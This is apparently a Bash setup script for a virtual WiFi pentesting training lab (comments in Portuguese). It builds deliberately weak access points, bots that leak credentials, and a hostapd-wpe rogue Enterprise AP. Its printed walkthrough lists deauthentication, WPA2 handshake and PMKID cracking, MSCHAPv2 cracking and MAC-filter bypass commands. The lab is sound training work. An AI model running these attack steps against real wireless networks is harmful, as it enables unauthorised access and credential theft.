#!/usr/bin/env bash
#
# ============================================================================
#  XPSec Academy - Lab WiFi Pentesting PRO (virtual / sem RF)  v3
# ============================================================================
#
#  Novidades da v3 (sobre a v2):
#   - PMKID clientless: AP WPA2-PSK dedicado em 5GHz. Aluno captura o PMKID
#     do 1o quadro EAPOL com hcxdumptool e cracka com hashcat -m 22000.
#     SEM cliente, SEM deauth (técnica moderna).
#   - WPA2-Enterprise (EAP): hostapd-wpe como RADIUS/EAP falso em 5GHz.
#     Uma vítima EAP-PEAP/MSCHAPv2 associa e vaza usuário + challenge/response,
#     crackável com asleap / hashcat -m 5500.
#   - Bandas 2.4GHz e 5GHz misturadas (iw reg set US) p/ variar o cenário.
#
#  Herdado da v2:
#   - Rede OPEN com servidor HTTP + bot de login em texto claro.
#   - WPA2-PSK no host.
#
#  (WEP e WPS foram removidos. O lab roda só com hostapd/wpa_supplicant
#   no host, sem container Docker.)
#
#  MAPA DE REDES
#  -------------
#   2.4GHz:  XPSEC-WPA2 (ch11)          XPSEC-OPEN (ch3)
#            XPSEC-MACACL (ch9, filtro de MAC)
#   5GHz:    XPSEC-PMKID (ch36, clientless)
#            XPSEC-CORP  (ch149, WPA2-Enterprise / hostapd-wpe)
#
#  ALVO: Kali Linux rolling, como root. Requer: iw, hostapd, wpasupplicant,
#        dnsmasq, rfkill, python3. Opcional (cenários novos):
#        hostapd-wpe, hcxdumptool, hcxtools, asleap, hashcat.
#
#  Tudo virtual: nenhum RF real, nada visível para dispositivos ao redor.
#  `--down` destrói APs, clientes e descarrega o módulo.
# ============================================================================

set -u

LAB_DIR="/tmp/xpsec-wifi-lab"
NUM_RADIOS=12

LOG()  { echo -e "\e[1;36m[xpsec]\e[0m $*"; }
WARN() { echo -e "\e[1;33m[aviso]\e[0m $*"; }
ERR()  { echo -e "\e[1;31m[erro]\e[0m $*" >&2; }
OK()   { echo -e "\e[1;32m[ ok ]\e[0m $*"; }

# ---- Credenciais / SSIDs do lab -------------------------------------------
SSID_WPA2="XPSEC-WPA2";  WPA2_PSK="verao2024"          # fraca de propósito
SSID_OPEN="XPSEC-OPEN"                                   # sem cripto
SSID_PMKID="XPSEC-PMKID"; PMKID_PSK="familia10"         # 5GHz, clientless
SSID_CORP="XPSEC-CORP"                                   # 5GHz, WPA2-Enterprise
CORP_IDENTITY="funcionario@xpsec.local"; CORP_PASS="Senha@Corp123"
SSID_MACACL="XPSEC-MACACL"                               # 2.4GHz, filtro de MAC (OPEN)
MACACL_ALLOWED="02:ca:fe:00:11:22"                       # único MAC na allowlist

# Sub-redes IP
OPEN_NET="10.0.4";   OPEN_AP_IP="${OPEN_NET}.1"
MACACL_NET="10.0.9"; MACACL_AP_IP="${MACACL_NET}.1"

# Interfaces no HOST (hwsim).
AP_WPA2="wlan_wpa2"; AP_OPEN="wlan_open"
AP_PMKID="wlan_pmkid"; AP_CORP="wlan_corp"; AP_MACACL="wlan_macacl"
STA_WPA2="sta_wpa2"; STA_OPEN="sta_open"; STA_CORP="sta_corp"
STA_MACACL="sta_macacl"
ATK="atk0"         # rádio managed livre p/ o aluno atacar (ex.: clonar MAC)
MON_IF="mon_lab"   # interface livre p/ o aluno colocar em monitor

# ===========================================================================
#  Pré-requisitos
# ===========================================================================
require_root() { [[ $EUID -eq 0 ]] || { ERR "Rode como root: sudo $0 $*"; exit 1; }; }

# ---- instala automaticamente tudo que o lab usa (bin -> pacote) -----------
install_deps() {
  # obrigatórios
  local pkgs=(iw hostapd wpasupplicant rfkill dnsmasq python3 aircrack-ng)
  # opcionais dos cenários (PMKID / Enterprise / MAC bypass / cracking)
  pkgs+=(hostapd-wpe hcxdumptool hcxtools asleap hashcat macchanger)

  LOG "Instalando dependências (apt). Pode levar alguns minutos..."
  export DEBIAN_FRONTEND=noninteractive
  apt-get update -qq || WARN "apt update falhou (sem internet?). Tentando instalar mesmo assim."

  # instala o que der; coleta o que não existe no repositório
  local failed=()
  for p in "${pkgs[@]}"; do
    if dpkg -s "$p" >/dev/null 2>&1; then
      continue
    fi
    if apt-get install -y -qq "$p" >/dev/null 2>&1; then
      OK "  instalado: $p"
    else
      failed+=("$p")
    fi
  done

  if ((${#failed[@]})); then
    WARN "Não instalei (ausentes no repo ou sem rede): ${failed[*]}"
    WARN "No Kali, habilite o repo:  deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware"
    WARN "Os cenários que dependem deles serão pulados; o resto do lab sobe normal."
  else
    OK "Todas as dependências presentes."
  fi
}

check_deps() {
  local missing=()
  local req=(iw hostapd wpa_supplicant modprobe rfkill dnsmasq python3)
  for b in "${req[@]}"; do
    command -v "$b" >/dev/null 2>&1 || missing+=("$b")
  done
  if ((${#missing[@]})); then
    WARN "Faltam (obrigatórios): ${missing[*]}"
    LOG  "Instale:  apt update && apt install -y hostapd wpasupplicant iw rfkill dnsmasq python3"
    exit 1
  fi
  # opcionais (só avisa, não bloqueia)
  local opt=()
  command -v hostapd-wpe >/dev/null 2>&1 || opt+=("hostapd-wpe(Enterprise)")
  command -v hcxdumptool >/dev/null 2>&1 || opt+=("hcxdumptool(PMKID)")
  command -v hcxpcapngtool >/dev/null 2>&1 || opt+=("hcxtools(PMKID)")
  command -v asleap >/dev/null 2>&1 || opt+=("asleap(Enterprise crack)")
  ((${#opt[@]})) && WARN "Opcionais p/ cenários novos: ${opt[*]}  ->  apt install -y hostapd-wpe hcxdumptool hcxtools asleap hashcat"
}

# ===========================================================================
#  Rádios virtuais
# ===========================================================================
load_hwsim() {
  LOG "Carregando mac80211_hwsim (${NUM_RADIOS} rádios virtuais)..."
  modprobe -r mac80211_hwsim 2>/dev/null
  modprobe mac80211_hwsim radios="$NUM_RADIOS" || { ERR "Kernel sem mac80211_hwsim."; exit 1; }
  rfkill unblock all 2>/dev/null
  iw reg set US 2>/dev/null          # libera canais 5GHz (UNII-1/UNII-3)
  sleep 1
  mapfile -t RAW < <(iw dev | awk '/Interface/{print $2}' | grep -E '^wlan[0-9]+$' | sort -V)
  ((${#RAW[@]} >= 11)) || { ERR "Esperava >=11 ifaces hwsim, achei ${#RAW[@]}. Outro adaptador WiFi presente?"; exit 1; }
  OK "Rádios: ${#RAW[@]} (${RAW[*]})"
}

phy_of() { iw dev "$1" info 2>/dev/null | awk '/wiphy/{print "phy"$2}'; }

rename_if() {  # $1=origem wlanX  $2=novo nome
  ip link show "$2" >/dev/null 2>&1 && return 0
  ip link set "$1" down 2>/dev/null
  ip link set "$1" name "$2" 2>/dev/null && ip link set "$2" up 2>/dev/null && OK "  $1 -> $2"
}

assign_host_ifaces() {
  LOG "Nomeando interfaces do host..."
  rename_if "${RAW[0]}"  "$AP_WPA2"
  rename_if "${RAW[1]}"  "$AP_OPEN"
  rename_if "${RAW[2]}"  "$AP_PMKID"
  rename_if "${RAW[3]}"  "$AP_CORP"
  rename_if "${RAW[4]}"  "$AP_MACACL"
  rename_if "${RAW[5]}"  "$STA_WPA2"
  rename_if "${RAW[6]}"  "$STA_OPEN"
  rename_if "${RAW[7]}"  "$STA_CORP"
  rename_if "${RAW[8]}"  "$STA_MACACL"
  rename_if "${RAW[9]}"  "$ATK"
  rename_if "${RAW[10]}" "$MON_IF"
}

# ===========================================================================
#  APs 2.4GHz no host: WPA2, OPEN
# ===========================================================================
start_host_aps() {
  mkdir -p "$LAB_DIR"
  cat > "$LAB_DIR/ap_wpa2.conf" <<EOF
interface=${AP_WPA2}
driver=nl80211
ssid=${SSID_WPA2}
hw_mode=g
channel=11
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=${WPA2_PSK}
EOF
  cat > "$LAB_DIR/ap_open.conf" <<EOF
interface=${AP_OPEN}
driver=nl80211
ssid=${SSID_OPEN}
hw_mode=g
channel=3
auth_algs=1
EOF

  LOG "Subindo APs 2.4GHz (WPA2/OPEN)..."
  hostapd -B -t -f "$LAB_DIR/hostapd_wpa2.log" "$LAB_DIR/ap_wpa2.conf" && OK "AP $SSID_WPA2" || ERR "WPA2 falhou"
  hostapd -B -t -f "$LAB_DIR/hostapd_open.log" "$LAB_DIR/ap_open.conf" && OK "AP $SSID_OPEN" || ERR "OPEN falhou"
  sleep 2

  ip addr flush dev "$AP_OPEN" 2>/dev/null
  ip addr add "${OPEN_AP_IP}/24" dev "$AP_OPEN"; ip link set "$AP_OPEN" up
  pkill -f "dnsmasq.*${AP_OPEN}" 2>/dev/null
  dnsmasq --interface="$AP_OPEN" --bind-interfaces \
    --dhcp-range="${OPEN_NET}.50,${OPEN_NET}.150,12h" --no-resolv \
    --log-facility="$LAB_DIR/dnsmasq_open.log" 2>/dev/null && OK "DHCP na OPEN"

  # ---- MAC filter (OPEN + macaddr_acl=1): só o MAC da allowlist associa ----
  echo "${MACACL_ALLOWED}" > "$LAB_DIR/accept_mac.txt"
  cat > "$LAB_DIR/ap_macacl.conf" <<EOF
interface=${AP_MACACL}
driver=nl80211
ssid=${SSID_MACACL}
hw_mode=g
channel=9
auth_algs=1
# Lista branca de MAC: 1 = aceita só quem está no accept_mac_file
macaddr_acl=1
accept_mac_file=${LAB_DIR}/accept_mac.txt
EOF
  hostapd -B -t -f "$LAB_DIR/hostapd_macacl.log" "$LAB_DIR/ap_macacl.conf" \
    && OK "AP $SSID_MACACL (OPEN + filtro de MAC; autorizado: $MACACL_ALLOWED)" \
    || ERR "MACACL falhou. Log: $LAB_DIR/hostapd_macacl.log"
  sleep 1
  ip addr flush dev "$AP_MACACL" 2>/dev/null
  ip addr add "${MACACL_AP_IP}/24" dev "$AP_MACACL"; ip link set "$AP_MACACL" up
}

# ===========================================================================
#  APs 5GHz: PMKID (clientless) + WPA2-Enterprise (hostapd-wpe)
# ===========================================================================
start_5ghz_aps() {
  LOG "Subindo APs 5GHz (PMKID + Enterprise)..."

  # ---- PMKID: WPA2-PSK, clientless. hostapd inclui o PMKID no EAPOL M1 ----
  cat > "$LAB_DIR/ap_pmkid.conf" <<EOF
interface=${AP_PMKID}
driver=nl80211
ssid=${SSID_PMKID}
country_code=US
ieee80211d=1
hw_mode=a
channel=36
ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=${PMKID_PSK}
EOF
  hostapd -B -t -f "$LAB_DIR/hostapd_pmkid.log" "$LAB_DIR/ap_pmkid.conf" \
    && OK "AP $SSID_PMKID (5GHz ch36, PMKID clientless)" \
    || ERR "PMKID falhou. Log: $LAB_DIR/hostapd_pmkid.log"

  start_corp_enterprise
}

start_corp_enterprise() {
  if ! command -v hostapd-wpe >/dev/null 2>&1; then
    WARN "hostapd-wpe ausente; tentando instalar..."
    apt-get install -y -qq hostapd-wpe >/dev/null 2>&1 \
      || { WARN "Sem hostapd-wpe. Pulando Enterprise. (apt install -y hostapd-wpe)"; return 1; }
  fi
  local base="/etc/hostapd-wpe/hostapd-wpe.conf"
  if [[ -f "$base" ]]; then
    # reaproveita os certs que já vêm no pacote; só troca iface/ssid/banda
    cp "$base" "$LAB_DIR/ap_corp.conf"
    sed -i "s/^interface=.*/interface=${AP_CORP}/"  "$LAB_DIR/ap_corp.conf"
    sed -i "s/^ssid=.*/ssid=${SSID_CORP}/"          "$LAB_DIR/ap_corp.conf"
    sed -i "s/^hw_mode=.*/hw_mode=a/"               "$LAB_DIR/ap_corp.conf"
    sed -i "s/^channel=.*/channel=149/"             "$LAB_DIR/ap_corp.conf"
    grep -q "^country_code" "$LAB_DIR/ap_corp.conf" || echo "country_code=US" >> "$LAB_DIR/ap_corp.conf"
    grep -q "^ieee80211d"   "$LAB_DIR/ap_corp.conf" || echo "ieee80211d=1"    >> "$LAB_DIR/ap_corp.conf"
  else
    WARN "Config base do hostapd-wpe não encontrada; gerando mínima (confira certs em /etc/hostapd-wpe/certs)."
    cat > "$LAB_DIR/ap_corp.conf" <<EOF
interface=${AP_CORP}
driver=nl80211
ssid=${SSID_CORP}
country_code=US
ieee80211d=1
hw_mode=a
channel=149
ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.pem
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh
EOF
  fi
  hostapd-wpe -B -t -f "$LAB_DIR/hostapd_corp.log" "$LAB_DIR/ap_corp.conf" \
    && OK "AP $SSID_CORP (5GHz ch149, WPA2-Enterprise / hostapd-wpe)" \
    || { ERR "hostapd-wpe falhou. Log: $LAB_DIR/hostapd_corp.log"; return 1; }
}

# ===========================================================================
#  Servidor HTTP + bot de credenciais na rede OPEN
# ===========================================================================
start_open_bot() {
  LOG "Servidor HTTP (login em texto claro) + bot na rede OPEN..."
  cat > "$LAB_DIR/open_server.py" <<'PY'
import http.server, socketserver
LOGIN = b"""<html><body><h2>XPSEC Intranet - Login</h2>
<form method="POST" action="/login">
User: <input name="user"><br>Pass: <input name="pass" type="password"><br>
<input type="submit"></form></body></html>"""
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type","text/html")
        self.end_headers(); self.wfile.write(LOGIN)
    def do_POST(self):
        n=int(self.headers.get("Content-Length",0)); self.rfile.read(n)
        self.send_response(200); self.send_header("Content-Type","text/html")
        self.end_headers(); self.wfile.write(b"<h3>Bem-vindo!</h3>")
with socketserver.TCPServer(("OPEN_AP_IP",80),H) as s:
    s.serve_forever()
PY
  sed -i "s/OPEN_AP_IP/${OPEN_AP_IP}/" "$LAB_DIR/open_server.py"
  nohup python3 "$LAB_DIR/open_server.py" >/dev/null 2>&1 &
  echo $! > "$LAB_DIR/open_server.pid"

  cat > "$LAB_DIR/sta_open.conf" <<EOF
ctrl_interface=/run/wpa_open
network={
    ssid="${SSID_OPEN}"
    key_mgmt=NONE
}
EOF
  wpa_supplicant -B -i "$STA_OPEN" -c "$LAB_DIR/sta_open.conf" -f "$LAB_DIR/wpa_open.log" 2>/dev/null
  sleep 3
  ( dhclient -v "$STA_OPEN" 2>"$LAB_DIR/dhcp_open.log" || ip addr add "${OPEN_NET}.60/24" dev "$STA_OPEN" ) &
  sleep 3

  cat > "$LAB_DIR/open_bot.sh" <<EOF
#!/bin/bash
while true; do
  curl -s "http://${OPEN_AP_IP}/" >/dev/null 2>&1
  curl -s -d "user=funcionario&pass=Intranet@2026" "http://${OPEN_AP_IP}/login" >/dev/null 2>&1
  sleep 3
done
EOF
  chmod +x "$LAB_DIR/open_bot.sh"
  nohup "$LAB_DIR/open_bot.sh" >/dev/null 2>&1 &
  echo $! > "$LAB_DIR/open_bot.pid"
  OK "Bot OPEN: login em texto claro (user=funcionario / pass=Intranet@2026)."
}

# ===========================================================================
#  Clientes: WPA2 (handshake) + vítima Enterprise (MSCHAPv2)
# ===========================================================================
start_host_clients() {
  LOG "Cliente WPA2 (gera handshake)..."
  for pair in "$STA_WPA2|$SSID_WPA2|$WPA2_PSK"; do
    IFS='|' read -r ifc ssid psk <<< "$pair"
    cat > "$LAB_DIR/${ifc}.conf" <<EOF
ctrl_interface=/run/wpa_${ifc}
network={
    ssid="${ssid}"
    key_mgmt=WPA-PSK
    psk="${psk}"
}
EOF
    wpa_supplicant -B -i "$ifc" -c "$LAB_DIR/${ifc}.conf" -f "$LAB_DIR/${ifc}.log" 2>/dev/null \
      && OK "  $ifc -> $ssid" || WARN "  $ifc não associou"
  done
}

MACACL_NS="xpsec_macacl"   # netns do cliente autorizado

start_macacl_client() {
  LOG "Cliente autorizado do filtro de MAC (clona $MACACL_ALLOWED e gera tráfego REAL no ar)..."
  cat > "$LAB_DIR/sta_macacl.conf" <<EOF
ctrl_interface=/run/wpa_macacl
network={
    ssid="${SSID_MACACL}"
    key_mgmt=NONE
}
EOF

  # Motivo do netns: se o cliente e o AP ficam no MESMO namespace, o ping ao
  # IP do AP é entregue por loopback (local) e NÃO passa pelo rádio -> o
  # monitor não vê o STATION. Num netns separado, o tráfego é obrigado a sair
  # pelo rádio virtual; como o meio do hwsim é global, o mon_lab captura tudo.
  local phy; phy=$(phy_of "$STA_MACACL")
  if [[ -n "$phy" ]] && ip netns add "$MACACL_NS" 2>/dev/null; then
    ip link set "$STA_MACACL" down 2>/dev/null
    if iw phy "$phy" set netns name "$MACACL_NS" 2>/dev/null; then
      ip netns exec "$MACACL_NS" ip link set lo up 2>/dev/null
      ip netns exec "$MACACL_NS" ip link set "$STA_MACACL" address "$MACACL_ALLOWED" 2>/dev/null
      ip netns exec "$MACACL_NS" ip link set "$STA_MACACL" up 2>/dev/null
      ip netns exec "$MACACL_NS" wpa_supplicant -B -i "$STA_MACACL" \
        -c "$LAB_DIR/sta_macacl.conf" -f "$LAB_DIR/sta_macacl.log" 2>/dev/null
      sleep 3
      ip netns exec "$MACACL_NS" ip addr add "${MACACL_NET}.60/24" dev "$STA_MACACL" 2>/dev/null
      # ping ao AP: agora atravessa o rádio (ARP + ICMP visíveis no monitor)
      ip netns exec "$MACACL_NS" bash -c \
        "while true; do ping -c 1 -W 1 ${MACACL_AP_IP} >/dev/null 2>&1; sleep 1; done" &
      echo $! > "$LAB_DIR/macacl_traffic.pid"
      OK "  Cliente autorizado associado a $SSID_MACACL (netns $MACACL_NS, MAC $MACACL_ALLOWED)"
      OK "  Gerando tráfego no ar -> aparece como STATION no airodump (canal 9)."
      return 0
    else
      WARN "  Falha ao mover o rádio p/ o netns; usando modo simples (pode não gerar data frames)."
      ip netns del "$MACACL_NS" 2>/dev/null
    fi
  else
    WARN "  Sem netns disponível; usando modo simples."
  fi

  # Fallback (sem netns): associa no namespace raiz. O STATION aparece ao
  # associar, mas sem data frames contínuos.
  ip link set "$STA_MACACL" down 2>/dev/null
  ip link set "$STA_MACACL" address "$MACACL_ALLOWED" 2>/dev/null
  ip link set "$STA_MACACL" up 2>/dev/null
  wpa_supplicant -B -i "$STA_MACACL" -c "$LAB_DIR/sta_macacl.conf" -f "$LAB_DIR/sta_macacl.log" 2>/dev/null \
    && OK "  Cliente autorizado associado a $SSID_MACACL" \
    || WARN "  Cliente autorizado não associou (ver $LAB_DIR/sta_macacl.log)"
}

start_corp_victim() {
  command -v hostapd-wpe >/dev/null 2>&1 || return 0   # sem AP Enterprise, sem vítima
  LOG "Vítima Enterprise (EAP-PEAP/MSCHAPv2) associando..."
  cat > "$LAB_DIR/sta_corp.conf" <<EOF
ctrl_interface=/run/wpa_corp
network={
    ssid="${SSID_CORP}"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="${CORP_IDENTITY}"
    password="${CORP_PASS}"
    phase2="auth=MSCHAPV2"
}
EOF
  wpa_supplicant -B -i "$STA_CORP" -c "$LAB_DIR/sta_corp.conf" -f "$LAB_DIR/sta_corp.log" 2>/dev/null \
    && OK "  Vítima $STA_CORP -> $SSID_CORP (vaza MSCHAPv2 p/ hostapd-wpe)" \
    || WARN "  Vítima EAP não associou (ver $LAB_DIR/sta_corp.log)"
}

# ===========================================================================
#  Teardown
# ===========================================================================
lab_down() {
  LOG "Derrubando lab..."
  for p in "$LAB_DIR/open_server.pid" "$LAB_DIR/open_bot.pid" "$LAB_DIR/macacl_traffic.pid"; do
    [[ -f "$p" ]] && kill "$(cat "$p")" 2>/dev/null
  done
  pkill -f "$LAB_DIR" 2>/dev/null
  pkill -f "open_bot.sh" 2>/dev/null
  pkill -f "open_server.py" 2>/dev/null
  pkill -x hostapd-wpe 2>/dev/null
  pkill -f "dnsmasq.*${AP_OPEN}" 2>/dev/null
  # netns do cliente MACACL: mata processos dentro dele e remove
  if ip netns list 2>/dev/null | grep -q "${MACACL_NS:-xpsec_macacl}"; then
    ip netns pids "${MACACL_NS:-xpsec_macacl}" 2>/dev/null | xargs -r kill 2>/dev/null
    ip netns del "${MACACL_NS:-xpsec_macacl}" 2>/dev/null && OK "netns do MACACL removido."
  fi
  sleep 1
  modprobe -r mac80211_hwsim 2>/dev/null && OK "mac80211_hwsim removido." \
    || WARN "Não removi mac80211_hwsim (ainda em uso). Rode --down de novo."
  rm -rf "$LAB_DIR"
  OK "Lab destruído. Sem resíduo."
}

lab_status() {
  LOG "Interfaces 802.11:"; iw dev 2>/dev/null | awk '/Interface/{print "  - "$2}'
  echo; LOG "APs (hostapd/hostapd-wpe no host):"; pgrep -af 'hostapd' | grep -E "$LAB_DIR" || echo "  (nenhum)"
  echo; LOG "Cliente MACACL (netns ${MACACL_NS:-xpsec_macacl}):"
  if ip netns list 2>/dev/null | grep -q "${MACACL_NS:-xpsec_macacl}"; then
    ip netns exec "${MACACL_NS:-xpsec_macacl}" iw dev "$STA_MACACL" link 2>/dev/null \
      | awk '/Connected|SSID/{print "  "$0}' || echo "  (no netns, sem link)"
  else
    echo "  (netns ausente)"
  fi
}

# ===========================================================================
#  Resumo
# ===========================================================================
print_summary() {
  cat <<EOF

$(echo -e '\e[1;32m')==================================================================$(echo -e '\e[0m')
  LAB XPSEC WIFI PRO v3 NO AR   (100% virtual, sem RF real)
$(echo -e '\e[1;32m')==================================================================$(echo -e '\e[0m')

  2.4GHz
   1) $SSID_WPA2   ch 11  WPA2-PSK fraca  (senha: $WPA2_PSK)
   2) $SSID_OPEN   ch 3   ABERTA + bot HTTP (user=funcionario / pass=Intranet@2026)
   3) $SSID_MACACL ch 9   ABERTA + filtro de MAC (autorizado: $MACACL_ALLOWED)
  5GHz
   4) $SSID_PMKID  ch 36  WPA2-PSK CLIENTLESS p/ PMKID  (senha: $PMKID_PSK)
   5) $SSID_CORP   ch 149 WPA2-Enterprise via hostapd-wpe (vítima: $CORP_IDENTITY)

  Interfaces p/ o aluno: monitor=$MON_IF  |  atacante (managed)=$ATK
  Configs/logs:  $LAB_DIR

  ROTEIRO RÁPIDO
  --------------
  # Monitor (vê 2.4 e 5GHz)
  sudo ip link set $MON_IF down && sudo iw dev $MON_IF set type monitor && sudo ip link set $MON_IF up
  sudo airodump-ng --band abg $MON_IF

  # OPEN (2.4): credenciais em claro
  sudo airodump-ng -c 3 --bssid <BSSID_OPEN> -w /tmp/open $MON_IF
  wireshark /tmp/open-01.cap   # http.request.method == "POST"

  # WPA2 (2.4): handshake + wordlist
  sudo airodump-ng -c 11 --bssid <BSSID_WPA2> -w /tmp/wpa2 $MON_IF
  sudo aireplay-ng -0 3 -a <BSSID_WPA2> $MON_IF
  printf '123456\\nverao2024\\nadmin123\\n' > /tmp/wl.txt ; aircrack-ng -w /tmp/wl.txt /tmp/wpa2-01.cap

  # PMKID (5GHz): SEM cliente, SEM deauth
  sudo hcxdumptool -i $MON_IF -w /tmp/pmkid.pcapng --rds=1
  hcxpcapngtool -o /tmp/pmkid.22000 /tmp/pmkid.pcapng
  printf 'familia10\\n12345678\\n' > /tmp/wlp.txt ; hashcat -m 22000 /tmp/pmkid.22000 /tmp/wlp.txt

  # WPA2-Enterprise (5GHz): hostapd-wpe JÁ captura quando a vítima conecta
  grep -A3 -i mschapv2 $LAB_DIR/hostapd_corp.log      # username / challenge / response
  asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
  #   (alternativa: hashcat -m 5500)

  # MAC filter bypass (2.4, ch9): descubra o MAC autorizado e clone-o
  sudo airodump-ng -c 9 --bssid <BSSID_MACACL> $MON_IF   # veja o STATION autorizado
  #   tente associar com SEU mac -> recusado; agora clone o autorizado em $ATK:
  sudo ip link set $ATK down
  sudo macchanger -m $MACACL_ALLOWED $ATK
  sudo ip link set $ATK up
  #   associe à XPSEC-MACACL (OPEN) com o MAC clonado -> filtro furado

  DERRUBAR TUDO:  sudo $0 --down

$(echo -e '\e[1;33m')Nenhuma dessas redes é visível por celulares/notebooks ao redor.$(echo -e '\e[0m')

EOF
}

usage() {
  cat <<EOF
Uso:
  sudo $0 --up         Instala deps + sobe o lab (2.4/5GHz, 6 redes + bots)
  sudo $0 --install    Só instala as dependências (nada é iniciado)
  sudo $0 --down       Destrói tudo
  sudo $0 --status     Estado atual

Dica: o --up já roda o apt sozinho. Sem WEP (não precisa de Docker).
EOF
}

main() {
  case "${1:---up}" in
    --up)
      require_root "$@"; install_deps; check_deps
      load_hwsim; assign_host_ifaces
      start_host_aps; start_5ghz_aps; start_open_bot
      start_host_clients; start_macacl_client; start_corp_victim
      print_summary ;;
    --install) require_root "$@"; install_deps ;;
    --down)    require_root "$@"; lab_down ;;
    --status)  lab_status ;;
    -h|--help) usage ;;
    *) ERR "Opção inválida: $1"; usage; exit 1 ;;
  esac
}
main "$@"
